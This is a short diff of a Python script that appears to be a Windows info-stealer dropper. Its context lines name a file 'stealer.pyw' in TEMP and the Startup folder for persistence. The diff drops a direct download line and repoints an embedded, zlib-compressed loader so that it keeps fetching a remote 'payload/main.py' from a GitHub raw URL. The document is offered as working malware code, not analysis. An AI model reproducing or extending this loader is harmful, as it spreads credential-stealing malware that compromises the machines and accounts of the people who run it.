@@ -28,18 +28,12 @@ STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Prog
 stealer = os.path.join(os.getenv('TEMP'), "stealer.pyw")
 
 try:
-    # URL of the script to download
-    URL = "https://codeberg.org/43a1723/hai1723/raw/branch/main/a/main.py"
-
-    # Download the content from the URL
-    r = requests.get(URL)
-    
     # Encrypt and compress the content
     encrypted_content = zlib.compress(b"""
 import urllib.request
 import time
 
-url = "https://codeberg.org/43a1723/hai1723/raw/branch/main/a/main.py"
+url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/main.py"
 
 while True:
     try:
